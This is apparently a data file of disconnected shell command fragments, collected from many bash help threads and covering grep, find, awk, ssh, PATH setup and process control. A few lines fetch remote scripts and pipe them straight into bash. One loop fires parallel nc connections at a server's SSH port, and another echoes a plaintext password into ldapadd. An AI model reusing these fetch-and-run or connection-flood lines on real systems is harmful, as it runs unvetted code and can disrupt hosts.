printf '%q ' "$@"
grep 'this' && '/this' && !('not-this')
grep -Er -C 2 '.*this.*this.*' . | grep -Ev 'not-this'
man bash
port 8000
SUCCESS: The process with PID 5104 has been terminated.
cut -d: -f3-4
read -a
command <<< string
echo string | command
< <(command)
-d ''
fuser -k 8000/tcp
(/usr/local/bin/wrun 'uptime;ps -elf|grep httpd|wc -l;free -m;mpstat')
sleep 5
sleep 100
(/usr/local/bin/wrun 'uptime;ps -elf|grep httpd|wc -l;free -m;mpstat')
ls -latr --time-style=long-iso
grep -ir "function.*\n*.*include" *
grep -ir "function.*[[space]]*.*include" *
grep "`cat file1.txt `" file2.txt
grep -f
String cmd = "split -a -d -b 10M test.txt";
Process execProc = Runtime.getRuntime().exec(cmd);
filenameX is not sorted:
-t ';'
-a 1 -a 2
-o 0 1.2 1.3 2.2 2.3
<(sort -n file1)
<(sort -n file2)
$( )
ls | sed -e 's/\..*$//'
man basename
[ -e "$f" ]
{ ... }
>/tmp/logfile 2>&1
awk -F: '/flags/ && $1 !~ /^lo/ {print $1}'
/flags/ && $1 !~ /^lo/ {print $1}
while read if; do [...] done
{print $1}
{ }
copy mytable(
hello mytable\ncopy mytable(
exit 0
grep -L
grep -c
GNU awk 4
grep -c
read addName
grep -oP
grep -P
Rails 4.0.3
Ruby 1.9.3
ruby -v
Ruby 2.0.0
sed -i 's/^firmware_version .*/firmware_version 12.4/' /config.txt
"firmware_version .*"
sed -i 's/^(firmware_version) .*/\1 12.4/'
-i inplace
$1 == k
BEGIN {p="^"k} $0 ~ p
which hadoop
BufferedReader stdInput = new BufferedReader(new InputStreamReader(pr.getInputStream()));
set +H
exit 0
eval "$(dircolors -b ~/.dir_colors)"
ls -l | xargs -0 echo
rvm use --default 2.1.0
find $PWD
find $PWD
man find
sed -i
type -a tee(.exe)
Git Bash
Git Bash
Git Bash
"ID: 23409184074
test='"ID: 23409184074'
echo "$test" | cut -d " " -f 2
2> /dev/null
read var
range "7.2-55.0"
pcregrep -o1
44[tip] 3764d6b8ae82 2014-04-01 16:34 +0400 igor
man date
1A to A1
2B to B2
man rev
number + A or B
ssh root@172.17.0.x
ssh root@172.17.0.x
/usr/sbin/sshd -D
sshd -D
sshd -D
awk -v i=$i
for (( i=10; i<=130; i+=8 ))
for i in {10..130..8}
echo $i
man seq
$( seq 10 8 130 )
kill pid
pkill scriptname
kill -9 pid
kill -9
help [[
OPEN WITH
assoc /?
ftype /?
sudo -u
sudo su -
read listing
git bash
grep -v -f
bash -x
bash -x
file name.txt
removing quotes
man bash
./compute 3 + 1
#!/bin/bash -x
sudo apt-get install libcurl4-gnutls-dev libexpat1-dev gettext libz-dev libssl-dev build-essential
tar -zxf git-1.9.0.tar.gz
cd git-1.9.0/
make prefix=/usr/local all
sudo make prefix=/usr/local install
make configure
$ hash -d
# forget where
came from
gnu awk
sort -rn file
awk -F "-" '!a[$2]++'
pgrep python
pgrep java
13 31.5 23 22.4 55 10.1
Values: foo bar
Values: foo
"Values: $@"
"Values: foo"
"foo bar"
"Values: $*"
"Values: foo bar"
Values: foo bar
echo $JAVA_HOME
echo $PATH
lg199447@VDCALD564 /]$
chsh -s /bin/bash
bash -l
cat File | tr ':' '\n'
for MYVAR in $(cat File | tr ':' '\n') ; do echo ${MYVAR} ; done
dialog --menu
man bash
HISTORY EXPANSION
man bash
Programmable Completion
$(< file.txt)
$(< file.txt)
$(cat file.txt)
< file
$(< file.txt)
$(cat file)
$(< file)
sort -k1,1 -k2,2 -k3,3
head -n 1
ls -b *.html
set ff=unix
echo 'command' | /bin/nc ip port -w 3
#!/usr/bin/env bash
printf "cd: "
-maxdepth 1
-exec mkdir "$dir/$str" \;
-execdir mkdir "$str" \;
man getrusage
(f[1] == "") or (f[2] == "") or (f[3] == ""),
sleep 2
ps -p $pid -o pid | grep $pid
datenow=$(date +%Y%M%d)
for file in $(ls rootDirectory)
this is my apply on a pie
$ stty raw -echo
stty -echo
stty raw
-F': '
/^Priority: important/
{print a}
Priority: important
ls -l
man ls
du -s
cd dev
cd dev
cut -c 1-52000
awk '{ NR==1 substr( 1, 52000) } { print }' infile
man head
{ print $0 }
grep -P
too many arguments
prepend PATH /a/new/directory/that/exists
help getopts
open /path/to/your-script
File > New
Run Shell Script
Login Items
System Preferences > User & Groups > Login Items
chmod +x /Users/Shared/Test.sh
sudo defaults write com.apple.loginwindow LoginHook /Users/Shared/Test.sh
osascript -e 'display dialog "Proceed?"'
man launchd.plist
Lingon 3
<!-- ... -->
launchctl load
sudo nano /Library/LaunchAgents/LoginScripts.Test.plist
<!-- ... -->
launchctl load
man test
ls -alis | grep me
ls -alis | grep me
eval $c
Log.i("UNIQUE_TAG", the_data_string_you_want_to_send_back_to_your_script);
-m <count>
-t <time>
-T <time>
logcat -c
${ }
bash -c "php script.php $ARGS_PHP"
usage: command not found
-f format
$(call update-latest,${what})
data-only: what=data
awk '{a[$3]++}!(a[$3]-1)' file
-t ' '
-k 1,1
awk '!a[$0]++'
awk '!a[$1]++'
for dbuser in DROPBOX_USERS; do
du -hs folder/*
sudo npm install -g gulp
which gulp
sudo ln /usr/bin/nodejs /usr/bin/node
"Key does not exist"
if ... else
"key does not exist"
 2>/dev/null
$(( ... ))
${Data_results[@]/%/ +}
 +
(1 2 3)
1 + 2 + 3 +
[[ ... ]]
GNU find
find / -type f -mtime -1
sleep 500
man pgrep
[[ $(pidof 'NetworkManager') ]] && echo "Running" || echo "Not Running"
-t' '
while read
source command
man bash
"Processing *.ui"
apt-get show
apt-cache search
apt-cache show
apt-cache search terminal
| cut -d "-" -f 1
| grep terminal
| xargs -I % bash -c 'echo %; apt-cache show %; echo -e "\n"' > terminals.txt
apt-cache pkgnames
try/except KeyError
firefox -ProfileManager
stat -f%m
date +%z
chmod +x text
sh myscript.sh
bash --version
$(seq START INCREMENT END)
* * * * *
cp -r /stuff/folder1/. /stuff/folder2/
kill -SIGCONT
-C <n>
cat -n
diff -q
{ [ condition ] && { command ;} && command
if [ condition ]; then command, else command; fi
ps -p $last_pid -o comm=
find /path/to/directory/ -type f -perm -o=w
find /path/to/directory/ -type f -perm /u+w,g+w,o+w
-type f
-perm /u=w,g=w,o=w
-perm /222
/ /
while read
svn help update
python filename.py
C:\Python27\python.exe;C:\Program Files\Git\bin\bash.exe
.bashrc file
bash: python: command not found
bash: conda: command not found
python -V
conda --version
export PATH="$PATH:/c/Python36"
export PATH="$PATH:/d/Python36"
python -V
Python 3.6.5
echo 'export PATH="$PATH:/d/Python36"' > .bashrc
python -V
man env
return $1
touch foo.bin
done < names.txt
ssh -q
ssh -q "$i"
[[ and ]]
grep -P
echo INFOPLIST_FILE = MajorDomo/MajorDomo-Info.plist
your_script | cut -d = -f 2- | sed 's/^ *//'
your_script | sed 's/^[^=]*= *//'
--recursive ls s3://bucket1/bucket2/ | awk '{print$1}'
{x;s/ quiet/ quiet «extra text» /p;d}
task1 & task2 dir/ && task3 &
jobs -l
task2 dir/ && task3 &
kill pid-for-task1 pid-for-task2
mplayer $FRESH
mplayer FRESH
command mplayer
grep -a pattern file
grep -o
PuTTY Configuration
Connection->Data->Terminal-type String
./firstScript.sh 5 &
kill -2 %1
kill -2 <pid>
> /etc/apt/apt.conf.d/95proxies
Perl script, ASCII text executable
ssh-keygen -f ~/.ssh/scriptkey
scp -i ~/.ssh/scriptkey deployer@172.16.144.111
drush rsync
drush rsync
drush dd %%dump-dir
grep 'word' filename
rsync -aP ovh:"$src/$(printf "%q" "$1")" "$dst/"
rsync -aP ovh:"'$src/${1/\'/\\'}'" "$dst/"
test's file
"'/data/rtorrent/complete/test\'s file'"
zsh:1: unmatched '
shuffle -n1000000000 -p1
od -An -N4 -tu4
"checking whether make sets $(MAKE)"
make -f conftest.make
ssh -q
ssh -o LogLevel=error
echo tar zcf ~/backup/"$i".tar.gz "
| tr ' ' '?'"
kill -10 PID
/bin/sh -c
git commit
intA intB intC intD charP
FILE =
; do
perl script.pl
3/9/13 21.76
find $DIR -type f -exec grep $SEARCH /dev/null {} \;
[ ... ]
find "$DIR" will execute and the results will be passed to
. This will give the
[[ ... ]]
&> /dev/null
GNU find 4.4.2
--include <glob>
--exclude <glob>
exp_internal 1
mkdir $NAME...
# NAME=${1%.*}
# mkdir $NAME && cd $NAME
pstree -p $$
1.5 GB
2 hours
vmstat 1
iostat 1
perf top
perf record -a
eval echo ${string}
stdout=PIPE, stderr=STDOUT
while sed -n "${int}p"
java -version
opt/java/bin/java -version
uname -r
uname -r
-p arg
-t 0.1
shopt -s extglob
<eventtype uri="{any_url}/1031/"/>
ls -l | awk '{print $9}' | xargs -I {} cat {} | grep -o "/1031"
Do something...
echo $LASTBACKUP
source env.sh
sh env.sh
std input
std input
ssh, mplayer, HandBrakeCLI
set --
script1.sh foo bar
bash -x
Local Site Name
X = "\n\n"
mkfifo fifo
sh test.sh mynewfile.txt
fatal:Could not read from remote repository.
git add git@*****.com:/opt/git/project.git
xargs -P
#!/bin/bash -x
A == B
SD_counter == 148
147, 201, ..., 210, 148
[ "$SD_counter"==148 ]
[ "$SD_counter"==148 ]
[[ ... ]]
[ ... ]
[ ... ]
[[ ... ]]
(( ... ))
(( ... ))
ARITHMETIC EVALUATION
man bash
(( ... ))
(( SD_counter==148 ))
( string1 ... )
read -u 3
if [ $CATEGORIZE -gt 0 ]; then
help test
help '(('
(( ... )): (( expression ))
man bash
info bash
man [
man test
[ -e /hard/coded/path/$variable_filename ]
[[ ... ]]
dpkg -l
for loop
ncdump -v var61 myfile.nc
/var61 =/
grep -E -a -B 2 -A 3 'Possible' structure
grep '<PATTERN>' . -r
grep '<PATTERN>' <FILES>
man grep
tail -n 1 <file>
tail -n 1 output | sed 's/\(^Run in \)\([0-9]\+\)\( seconds$\)/\2/g'
tail -n 1 output | awk '{print $3}'
{ .. }
./drpm.sh admin_menu
-L 1
setopt INC_APPEND_HISTORY
~/Library/Application Support/
export L=~/Library/Application\ Support
source ~/.bash_profile
ls $L
/Users/username/Library/Application: Not a directory
~/Library/Application Support
"~/Library/Application Support"
"~/Library/Application\ Support"
"not working"
tail -f
-P $$
{ ...; }
|| echo 'ERROR: tail -f was killed' >&2
lsof +D /usr/bin
yolk -U
awk "{print $1} "
awk "{print }"
yolk -U
"${path// /\\ }"
v='dear me'; echo "${v/m*/you}"
'dear you'
v='sweet home'; echo "${v/home/$HOME}"
'sweet /home/jdoe'
v='It is now %T'; echo "${v/\%T/$(date +%T)}"
It is now 10:05:17
o1=1 o2=3 v="$o1 + $o2 equals result"; echo "${v/result/$(( $o1 + $o2 ))}"
'1 + 3 equals 4'
wc -l commands.txt
*/1 * * * * [ -s /tmp/#sql_362_0.MYD ] || rm -f /tmp/#sql_362_0.MYD
*/1 * * * * [ -s /tmp/#sql_*.MYD ] || rm -f /tmp/#sql_*.MYD
-maxdepth 1
-type f
-name <pattern>
man find
-i .bak
declare -n
printf -v
printf %q
ksh -D
set -xv
set -n
ksh -u
awk '/<$/ { print NR; }' <your-file>
grep -n
bash: 09: command not found
bash: 09: value too great for base (error token is "09")
man date
Ctrl+V + Ctrl+S + Ctrl+W
"Already script running"
printf " a = %10s and b= %10s |\n" "$a" $b"
bash 4
s/^/echo "/
echo "
s/(0x\(..\))/(\$(echo "ibase=16;\U\1\E"\|bc))/g
chmod 555 hex-to-decimal.sh
./hex-to-decimal.sh inputfilename > outputfilename
cat inputfilename | sed -r 's/\\/\\\\/g;s/`/\\`/g;s/"/\\"/g;s/\$/\\$/g;s/0x([0-9A-Fa-f]+)/\$(echo "ibase=16;\U\1\E" \| bc)/g;s/^/echo "/;s/$/"/e' > outputfilename
cat $1
| sed -r
/\$(echo "ibase=16;\U\1\E" \| bc)/g;
$(echo "ibase=16;
" | bc)
\$(echo "ibase=16;\U\1\E" \| bc)
echo "ibase=16;<hexadecimal number>" | bc
s/^/echo "/;
echo "
shopt -s extglob
[+-_ßäöüÄÖÜ., ]
man find
chmod -x . ~/bin/fns
< filename
\( block \)
find -maxdepth 2 -type f -print -exec make {} . \;
make: Nothing to be done for reduc211/makefile.
make reduc211/makefile
do ... done
corrupted behavior
trap 'env -0' exit
split -l 1 mytextfile.txt
git rebase -i HEAD~2
git commit --amend
if [[ "$(sensors)" =~ No* ]]
if [[ "$(sensors 2>&1)" == No* ]]
No sensors found
-exec mkdir -p $toDir/$(dirname {}) \;
-exec sh -c 'echo $(dirname {})' \;
parallel -j 200 < list0
img src
sed -i 's/.images/.\/images/g' filename.json
-h -g
crontab -e
declare -a VAR=([key]=val ...)
host db www test web test localhost bugs localhost hrm localhost ohrm localhost otrs
mysql -e
mysql -e
`r FILENAME'
BEGIN{ }
COR-3123 Fixed the bug, introduced a new one
svn log -r{2012-04-01}:{2014-04-01} | grep "COR-" | cut -f1 -d" " | sort -u
wget --quiet  --load-cookies cookies.txt -O - http://jira.example.com/browse/{HERE} | sed -n -e 's!.*<title>\(.*\)</title>.*!\1!p'
echo $foo
echo "1 2 3" > file
1 2 3
man fg
man history
man zsh
man zshbuiltins
OgreSource="$(echo $HOME)/garage-project/tryCV/tryOgre/tryOgre/media/Export/"
cd ${OgreSource}
No such process
echo $ENV_VAR
some value
echo $ENV_VAR
command + ' ' + filename
./configure --prefix
echo "job creation done"
echo "add file to job"
echo {faint,bright*}/{science,calib}/chip?
that other guy
len(spans) == 0
yield from
Here Documents
man bash
[[ -n $servicetest ]]
[[ ... ]]
[ ... ]
[[ ... ]]
> /dev/null
Alt-a hg-tags-mode
4607/video/streamvideo 1.flv
heroku run bash -a my-app
gnome-terminal -x ./my_func
export -f
export -f
declare -f
export -f
man ps
cat file | xargs -n2
paste - -
xargs -n2
for loop
for loop
service this start or stop
sudo -i
ssh remote-dev -t 'sudo -i; bash -l'
ssh root@...
./fileB.rb $line
< fileA
sed -n
|| echo ''
where there are no Xs or 9s (as per the second example) I would like to return an empty value
man bc
bc -l
cmd > file | cmd2
> file
ps -p $$ -o comm=
1 4
1 4 0.2 0.3
</notepads> "\n" <text to be appended>
<text to be appended>
r <file>
[[ ... ]]
| awk '{print $2}'
$ myprogram myfile.ext
my program
variable environment
> output_file
df -f "path to dir"
du -sh
head -n1
[[ -d "$dir3" ]]
( )
echo $out
What_I_want - 2x01 - blablabla.srt
What_I_want - 2x02 - blablablabla.srt
echo 'MySecretPassword' | ldapadd -h localhost -D "cn=admin,dc=sysadmin1,dc=hioa,dc=no" -W -x -f /etc/ldap/base.ldif
printf %q "$codice"
perl -e
xxd -r -p
xxd -r -p
echo -n "$password"
printf "%s" "$password"
echo $(somecommand)
printf "%s" "$(somecommand)"
RUN source
--rcfile /dev/fd/1001
<<<$(echo PS1=it_worked: )
docker run -it --rm some/image bash
man 2 kill
nano myfi
nano myfile.txt
ssh myho
ssh myhostname.example.com
complete -F myfunction ssh
ssh myho
ssh myho
echo 'MD5 (./x y.jpg) = 93845ad8b6fb2797d9f1d7e0622e9270' | sed 's/MD5 (\(.*\)) = \(.*\)/\1 \2/'
./x y.jpg 93845ad8b6fb2797d9f1d7e0622e9270
-t 1
set -x
bash -c string
tclsh -f
? ... ?
#!/usr/bin/env python
python ./a.py
absolute path
pattern like : awk -F"/" {print [what?]}
shopt -s nullglob
shopt -s extglob
shopt -s dotglob
curl -L https://get.rvm.io | bash -s stable --autolibs=enabled [--ruby] [--rails] [--trace]
\curl -sSL http://dot.ciel.im | bash $FLAG
*** | bash $FLAG
bash -s
grep -P
kill -9 26152
export PATH=/opt/local/bin:/opt/local/sbin:
(( ... ))
man test
if [ -f $file ];
ls -R $path
mget 123450???vel.radar.h5
for NAME in $AUTOSTART
./myscript.sh APP_NAME_WITHOUT_EXTENSION
./myscript.sh SystemUI
'php script.php >> output.txt'
echo $commands
parallel -j 4 --
'php script.php >> output.txt'
php script.php >> output.txt
1 2 3 4 5
1 2 3 4 5
*/1 * * * * xterm    -display :0 -hold -e 'which xterm'
*/1 * * * * xterm    -display :0 -hold -e '/home/name/bin/scriptaaa '
*/1 * * * * xterm    -display :0 -hold -e 'scriptaaa'
command not found
which xterm
Environment Variable 'GENICAM_ROOT_V2_3' not found
return $n
echo $n
max 1 3 2
brew upgrade
$ echo $BASH_VERSION
bash --version
bash -version
bash --version
echo $SHELL
Ftpd will not allow users to connect who are not using one of these shells.
echo $BASH_VERSION
chsh: /usr/local/Cellar/bash/4.2.45/bin/bash: non-standard shell
<main> attribute status: eDSAttributeNotFound
brew install bash
chsh -s
chsh -s /usr/local/Cellar/bash/4.2.45/bin/bash
> change Local/Default/Users/<username> UserShell /bin/bash /usr/local/bin/zsh
NR { [...] }
awk '{print "FALSE\n"$0}'
awk '{print "TRUE\n"$0}'
[ ... ]
[[ ... ]]
elif [ $2 == "go" ]
GNU sed version 4.2.1
other commands
[[ ... ]]
[ ... ]
-z "$entry"
echo "Folder doesn't exist on $machine";
sh -c 'command'
iTerm -> Preferences
Window & Tab Titles
Shell -> New Window
sleep 10
Hello World
'1s/^/#!\/usr\/bin\/env node\n/'
<IfModule prefork.c>
/^<IfModule prefork/
$(tail ...)
tail -n 1 /var/logs/sass/logs/style.log
help until
until: until COMMANDS; do COMMANDS; done
man echo
$( ... )
while read
< /dev/null
xxx class xxx
superclass xxx
help test
ARG1 OP ARG2
"ARG1" and "ARG2" are integers
man sed
man grep
grep -q
$ read line < $f
seq 5 > $f
lsof -p $$
ls -l
cat <(ls -l)
ls -l
ls -l
struct stat
man 7 inode
vim ~/.bash_profile
vim ~/.zshrc
(1) .zshenv 
ls /usr/local/patch/clone.example.com*|zip - -q@|base64
ssh -Aqt hop1.example.com ssh -Aqt hop2.example.com 'ls /usr/local/patch/clone.example.com*|zip - -q@|base64'
zip error: Nothing to do! (-)
ssh -Aqt hop1.example.com ssh -Aqt hop2.example.com 'ls /usr/local/patch/clone.example.com*'
#EMERGING THREATS RULESET
gnu sed
GNU awk
./script.sh 1395943855 1395943879
echo $PATH
echo $JAVA_HOME
echo $JRE_HOME
java -version
HL="timeout 25 ./srcds_linux"
eval $cmd
ls -1 | cat -n
ls -1 | awk '{print NR,$0}'
ls -1 | cat -n
alias commit='~/.scripts/commit.sh'
commit 'awesome bugfixes'
brew doctor
tr -d '\r'
vi /usr/local/bin/brew
:set fileformat=unix
[[ -f $f ]]
echo "$f $(wc -wl < "$f")"
$( ... )
gawk '{print}' file
gawk --version
export PATH=/usr/local/bin:/usr/local/:$PATH
which python
which pip
which django-admin.py
python django-admin.py startproject my_new_project
/usr/local/Cellar/python/2.7.6_1/Frameworks/Python.framework/Versions/2.7/Resources/Python.app/Contents/MacOS/Python: can't open file 'django-admin.py': [Errno 2] No such file or directory
echo -e
expr 40 - ${#b}
fdcloexec your command here
< 400
webURL =
echo $f | tr -dc '[0-9]'
git pull
scp -p -P 29418 [USERNAME]@[HOST]:hooks/commit-msg .git/hooks/
Permission denied (publickey)
git pull
git push
C:\Program Files (x86)\Git\share\git-core\templates\hooks
/etc directory
ssh_exchange_identification: Connection closed by remote host
for i in {0..12}; do nc targetserver.com 22 & done
E2EDP19001                       02002000000000000797578
sub(/^0+/, "", $2)
sed 's/$/d'
[[ $line =~ ^[[:digit:]]+$ ]] || continue
printf "%s\n" w q
export PATH=/home/usrname/epd/bin:$PATH
# Added by Canopy installer on 2014-03-29
# VIRTUAL_ENV_DISABLE_PROMPT can be set to '' to make bashprompt show that Canopy is active, otherwise 1
VIRTUAL_ENV_DISABLE_PROMPT=1 source /home/an/Enthought/Canopy_64bit/User/bin/activate
export PATH=/home/usrname/epd/bin:$PATH
replace all
aptitude install libncurses5-dev
. /home/andreas/.bashrc
. ./myscript
. /home/andreas/.bashrc
36^3 * 20 * 27 * 36 * 7 * 297 * 2^40 ~= 2 * 10^24
ceiling(log(2 * 10^24) / log(64)) = 14
ceiling(log(2 * 10^24) / log(95)) = 13
sort | uniq -c
sort | uniq -c
set -e
perlfaq5 #How do I change, delete, or insert a line in a file, or append to the beginning of a file?
<<< $LINE
split --line=3
paste -s x* -d',' >result
bash myscript.sh
fn &
df <- df[, -grep("GType.", colnames(df))]
grep -f
show config current_config
wait PID
{{ var1 }}
while read
awko vars data
-i inplace
> tmp && mv tmp file
-exec ... +
-exec ... {}
man find
find -exec
test -f $name
mv -n
ln -s
b c
'a b c *'
b c
FILES=`find ./* -type f -name "xyz*"`
echo "Hello world!"
'   '
cat ../address
Quote Removal
man bash
sh change_ruby_env.sh
echo \[t\]
echo '[t]'
echo "[t]"
echo "Home, sweet $HOME." # reference to variable $HOME; parameter expansion
echo "Today's date and the current time are: $(date)" # command substitution
echo "Let's put $(( 2 + 2 )) together." # arithmetic expansion
man bash
echo [root]
awk -F: '{}' /etc/passwd
CONDITION ACTION
jitsu deploy
prompt: Is this ok?:  (yes)
jitsu deploy
Is it
-v varName=varValue
-v Yesterday="$Yesterday"
$((  ))
while [ -z "$name" ]
hour=$(date +H)
hour=$(date +%H)
echo $date
man find
node mycode.js | less -N
node mycode.js
node script.js
git commit --amend
git commit --amend --author='someone else <someone@else.where>'
git push
git fetch
git add
git commit
git push
ssh-add -l
git bash
echo 'exit' >pipe
rm pipe
./test.sh B N A
echo "no backup needed, removing"
ls -AR
ls -AR ../path
./test.sh N
./test.sh A C
./test.sh B N C
7z a x.zip ../path/./C/bla/bla
x && y
logfile.txt + line
./. /01.pdf
find -print0
tar --null -T
psa foo
| grep -v 'grep'
bash -e <cmd>
vlc --repeat sound.wav
cvlc --play-and-exit
vlc --repeat sound.wav
> /path/to/script
> script
/usr/bin/env foo
ls -l > fileName.txt
ls -l >> fileName.txt
bc < file
"~/test.sh 2>&1 | mailx -s\"Cool title\" me@email.com"
2>&1 |
uname -o
uname -a
at -c
declare -a <array_name>=(value1 value2 value 3)
echo ${<array_name>[index]}
stat -s
trap finally SIGINT
alias EXPORT='alias'
function exporter() { echo $EXPORT }
export ALIAS='export'
alias export=$(function)
alias ll='ls -l'
alias findservice='grep "$1" /etc/services'
findservice() { grep "$1" /etc/services; }
ll filename
echo ll
echo $foo
echo foo
echo "$foo"
echo $foo
export LC_ALL=en_US.UTF-8
export PATH=/foo:/bar
LC_ALL=en_US.UTF-8 sort filename
aliases --> variables --> command substitutions --> special built-ins --> functions --> regular built-ins
builtin the_builtin
command -p the_builtin
sudo bash
sudo -i
sudo su
ssh root@localhost
sleep 10
cat ../address
my_email=$(cat ../address)
read -d ''
sed -e '/PATTERN/s/\n/ /g'
set -x
[[ ]]
(( ))
(( ))
find <DIR> -exec stat --printf="%n,%F\n" "{}" \;
***basename,file type
"regular file"
aaa=($(awk '/foo/{print $3}'
echo ${aaa[0])
-not -path
-not -path *test/.util/*
grep '^[0-9][0-9][0-9]$'
rm -r numbers
line 32: ((: 1 -ne 2 : syntax error in expression (error token is "2 ")
help test
cat names | wc -l
hash myutility >/dev/null 2>&1
node app.js
$ brew install node
$ sudo npm install -g express
$ sudo npm install -g express-generator
$ express testsite --hogan -c less
$ cd testsite && npm install
$ node app.js
node app.js
npm start
npm start
node app.js
node bin/www
myProgram "$@" | less
wc -l
grep -v "specifiedstring" filename
man comm
mv *.* dir1/
find . -type f -maxdepth 1 -exec mv {} dir1/ \;
DIR=(A B Supercalifragilistic)
./script A B Supercalifragilistic
./script A B S
A B Supercalifragilistic
DIR=(A B C D E F)
DIR=(A B Clarification D E F)
./script a b "d e" g
array=(a b "d e" g)
Clarification >> C
A B C D E
info bash
chmod +x banana
ps axw
"path": ...
-z "$var"
elif [ !-d $location ]
set -xv
set +xv
[ "string" ]
[[ "string" ]]
test string
man test
if [ "$(ls -A $variable)" ]
ls -A $variable
E4 B8 80
E4 BA 9B
while read
while read
while read REPLY
[[ ... ]]
find ... | grep -q .
[[ $(find ... | wc -l) -gt 0 ]]
find ... | grep -q .
[[ -f $(find ...) ]]
node npm mean bower and grunt
apt-get install node
zip -9 files.zip *.mp4
There was an error launching the application
curl --silent https://raw.githubusercontent.com/githubUser/repoName/master/installer.sh | bash
command "complex argument"
eval "$x"
ip route add
sleep 1
ip route add
sleep 1
sleep 1
STANDARD FORMAT SPECIFIERS
man ps
ps -o
15 months ago
export KEY_CONFIG=/etc/openvpn/easy-rsa/2.0/openssl-1.0.0.cnf
: _
$foo | some_command
#!/usr/bin/env bash
mktemp -d
grep -F
read -r
<test> && <somethingelse>
[[ $output ]]
[[ "$output" ]]
npm run
npm run build-js
npm run
npm run build-favicon
read -n1
help read
PATH="$PATH:$(echo /projects/main_project/*/bin | tr ' ' ':')"
ssh host "echo $(hostname)"
"... $(command substitution)"
ssh -t host ...
ssh host "/bin/bash -c \"more \\\$(find /my/path -name 'test*')\""
Parameter Expansion
arr=( "${arr[@]:1}" )
unset arr[0]
SHELL GRAMMAR
$ startx
$ yes | make config
$ grep -qF foo file && sed 's/foo/bar/' file > newfile
$ ( cd -P /var/www/webroot && echo "webroot is $PWD" )
SHELL GRAMMAR
find BASE_OF_SEARCH/*/foo -name \*.doc -type f | wc -l
find BASE_OF_SEARCH -name \*.doc -type f | grep foo | wc -l
. ./bash2.sh
. (source or dot operator)
if [[ $(cat ./fifo1) = 0 ]]
if [cat email | '/^[\w.-]+@[\w.-]+\.[A-Za-z]{2,6}$/' ]; then {
{ }
if ...
[ -z "$variable" ]
man test
uname -m
uname -i
char * path_argv[0]
MySQL credentials
//: is a directory
rails c
sudo bash file.sh
sh one.sh
shell_exec("sh one.sh");
sh two.sh
shell_exec("sh two.sh")
one or more integers separated by + signs
iconv -t UTF8-MAC
echo *.app
ame?M-^Atiq siMed Bu?M-^Hro.app
hexdump -C
0xC3 0xBC
0xCC 0x88
hexdump -C
quoteNonAscii am*tiq*siMed*B*ro.app
System Preferences > Language & Region
Preferences... > Settings > {Your Profile} > Advanced
Set locale environment variables on startup
Preferences... > Settings > {Your Profile} > Advanced
Character encoding
locale -a
illegal byte sequence
System Preferences
export LANG={localeId}
export LC_ALL={localeId}
export LANG=...
export LC_ALL=...
locale -a
(001 002)
(1 2)
shopt -s extglob
for i; do
for i in "$@"; do
help printf
ODT AGE CDT CO SEX TIME NUMB STRING_COM STRING_STATUS
ODT AGE CDT CO SEX TIME VALUE COMMENT
AGE ODT CDT CO SEX TIME VALUE COMMENT
grep -A2
grep -A3
#!/bin/env node
#!/bin/env node
"$1" "$2" "$3" ..
for file in $(ls -f *); do echo $file; done > output.txt
shopt -s nocasematch
chmod +x test.cgi
< > &
ntpq -np
"ntpq: read: Connection refused"
"No association ID's returned"
@ IN SOA
expr match
bash -c "echo -n foo"
bash -c "echo -n foo | cat"
sh -c "echo -n foo"
sh -c "echo -n foo | cat"
bash 3.2
sh -c "echo -n foo | cat
sh -c "echo -n foo"
echo > some_shared_file
set -o vi
Ctrl-x ctrl-e
ctrl-x ctrl-e
var1=$(softnas-cmd checkupdate)
echo $var1
var2=$(echo $var1 | jq .success)
Tail -n 1
tail -n 2
awk '{print $2}'
then echo "connection succeeded to $instance
alias julia="~/juila/julia"
bash -l
bash -l
.profile 
source ~/.bash_profile
vi ~/.bash_profile
source ~/.bash_profile
source ~/.zshrc
sudo nano ~/.zshrc
source ~/.bash_profile
If command is specified, it is executed on the remote host instead of a login shell.
expect -c
expect -c
gnu sed
help printf
set -A list value1 value2
android: command not found
arrow up
arrow down
cd /var/ww<tab>
file file
break 2
break 3
"asd.www.[i want this string].com"
<address>, <city>, <class>,<marks>
example.com (255)
(?<=TALB: )
\( \)
bash 2.05
bash 4
grep -P
bash 4
bash 4
while read line
sample = 1001
echo "Running ls -alh"
ls -alh
grep -oP
-f "def"
{command} << EOF
{lines of input}
ALT + TAB
ALT + TAB
sed: /Users/Shared/n.txt: No such file or directory
sed: /Users/Shared/20131216154714n.txt
ssh ... <<EOI
ssh ... <<'EOI'
printf '%q '
shopt -s nullglob
sh yourscript
head -n 42
js-beautify -r myfile.html
js-beautify -r *.html
xargs -0
xargs -n 1
tee >( wc >&3)
sed -E
sed -r
declare -p
if [
Resource Hacker
Resource Hacker
echo "$PLACE"
cat ./script.sh | bash
<( cmd )
bash < script
cat script | bash
bash script
. script
/User/j doe/test.txt
tail -n 1 $textfile
tail -n 1 /User/j doe/test.txt
tail -n 1 "$textfile"
"heya64 this is21 a good89 day91"
"12is 19ady 46aehy 89dgoo a hist"
awko file1 file2
bash /home/directory/main $file
chmod +x main
ps aux
ps aux | grep [h]ttpd
Apache2 is running (pid 1234)
Apache2 is NOT running.
["${names[0]}" == "10.247.78.207"]
[ "${names[0]}" == "10.247.78.207" ]
ssh -t user@host
GNU bash, version 3.2.48(1)-release (x86_64-apple-darwin11)
grep -EI --colour
grep --colour=always
grep --colour=auto
alias grep='grep -EI --colour=auto'
curr_ver=$(emacs --version | \grep -oE '[[:digit:]]+\.[.[:digit:]]*')
Settings > Project Interpreter > Python Interpreters > Add
export "$VAR1"
ls -1 | sort -n -t "_" -k1
date +"%d %m %Y"
man date
date +"%a %b %d"
declare -f
Notepad++: Edit > EOL Conversion > UNIX
man bash
hostname -i
> 45895
diff file1.html file2.html >> 1.txt
diff -r dir1/ dir2/
<( )
NAME=date +"%Y-%m-%d"
while read
def; ghi; jkl
sudo /path/to/script args
bash -x
set -x
[[ ]]
[ ]
[ foo || bar ]
[ foo
bar ]
[[ .. ]]
[[ foo || bar ]]
man test
done< "$file_input"
$(< file)
M-x customize-face
emacs -nw
[["$youranswer" == "$correctanswer"]]
cp a.txt b.txt
cp c.txt d.txt
cp e.txt f.txt
cat file | xargs -I{} cp {}
-n 2
bash -x
bash -x
cat $file | (while read l; do
if [ $file = "foo.[1-9]" ]; then
echo "File name is $file"
for (( i=1; i<=$hashNo; i++ ))
xargs -0
cp -t MEOW
getopt optstring parameters
getopt "r:" "$@"
getopt "r:" "$@"
ncat -l -p 9213
yes foo | tr -d '\n' | dd of=foo_200kb bs=1024 count=200
fill.sh bar 204800 > foo
set complete-=i
